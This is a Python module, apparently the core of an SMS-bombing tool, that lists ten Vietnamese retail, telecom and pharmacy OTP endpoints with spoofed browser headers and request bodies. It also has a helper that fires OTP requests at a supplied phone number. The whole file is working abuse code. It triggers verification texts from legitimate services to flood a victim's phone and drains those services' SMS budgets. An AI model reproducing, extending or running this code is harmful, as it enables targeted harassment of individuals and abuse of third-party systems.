"""Danh sách endpoint SMS — đồng bộ."""
from pyodide.http import pyfetch
import json, re

def _vn(p: str) -> str:
    n = re.sub(r"[^\d+]", "", p)
    if n.startswith("0"): return "+84" + n[1:]
    if n.startswith("84"): return "+" + n
    return n

def _json_hdr() -> dict:
    return {"content-type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.0.0 Safari/537.36"}

# (Giữ nguyên danh sách PROVIDERS như cũ)
PROVIDERS = [
    ("sapo", "POST", "https://www.sapo.vn/fnb/sendotp",
     {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.sapo.vn", "referer": "https://www.sapo.vn/dang-nhap-kenh-ban-hang.html"},
     lambda p: f"phonenumber={p}"),
    ("viettel", "POST", "https://viettel.vn/api/get-otp",
     {**_json_hdr(), "origin": "https://viettel.vn", "referer": "https://viettel.vn/dang-ky", "X-Requested-With": "XMLHttpRequest"},
     lambda p: json.dumps({"msisdn": p})),
    ("medicare", "POST", "https://medicare.vn/api/otp",
     {**_json_hdr(), "origin": "https://medicare.vn", "referer": "https://medicare.vn/login"},
     lambda p: json.dumps({"mobile": p, "mobile_country_prefix": "84"})),
    ("tv360", "POST", "https://tv360.vn/public/v1/auth/get-otp-login",
     {**_json_hdr(), "origin": "https://tv360.vn", "referer": "https://tv360.vn/login"},
     lambda p: json.dumps({"msisdn": p})),
    ("ghn", "POST", "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
     {**_json_hdr(), "origin": "https://sso.ghn.vn", "referer": "https://sso.ghn.vn/"},
     lambda p: json.dumps({"phone": p, "type": "register"})),
    ("fptshop", "POST", "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
     {**_json_hdr(), "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14", "order-channel": "1", "origin": "https://fptshop.com.vn", "referer": "https://fptshop.com.vn/"},
     lambda p: json.dumps({"fromSys": "WEBKHICT", "otpType": "0", "phoneNumber": p})),
    ("winmart", "POST", "https://api-crownx.winmart.vn/iam/api/v1/user/register",
     {**_json_hdr(), "authorization": "Bearer undefined", "x-api-merchant": "WCM", "origin": "https://winmart.vn", "referer": "https://winmart.vn/"},
     lambda p: json.dumps({"firstName": "Nguyen Van A", "phoneNumber": p, "masanReferralCode": "", "dobDate": "2000-01-01", "gender": "Male"})),
    ("lottemart", "POST", "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
     {**_json_hdr(), "origin": "https://www.lottemart.vn", "referer": "https://www.lottemart.vn/signup"},
     lambda p: json.dumps({"username": p, "case": "register"})),
    ("longchau", "POST", "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
     {**_json_hdr(), "order-channel": "1", "x-channel": "EStore", "origin": "https://nhathuoclongchau.com.vn", "referer": "https://nhathuoclongchau.com.vn/"},
     lambda p: json.dumps({"phoneNumber": p, "otpType": 0, "fromSys": "WEBKHLC"})),
    ("ahamove", "POST", "https://api.ahamove.com/api/v3/public/user/login",
     {**_json_hdr(), "origin": "https://app.ahamove.com", "referer": "https://app.ahamove.com/"},
     lambda p: json.dumps({"mobile": p, "country_code": "VN", "firebase_sms_auth": True})),
]

def fire_one(name: str, method: str, url: str, headers: dict, body_builder, phone: str):
    try:
        init = {"method": method, "headers": headers}
        if body_builder: init["body"] = body_builder(phone)
        if method == "GET": url = f"{url}?phoneNumber={phone}"
        resp = pyfetch(url, **init).sync()
        return resp.status
    except Exception as e:
        return f"ERR:{type(e).__name__}"
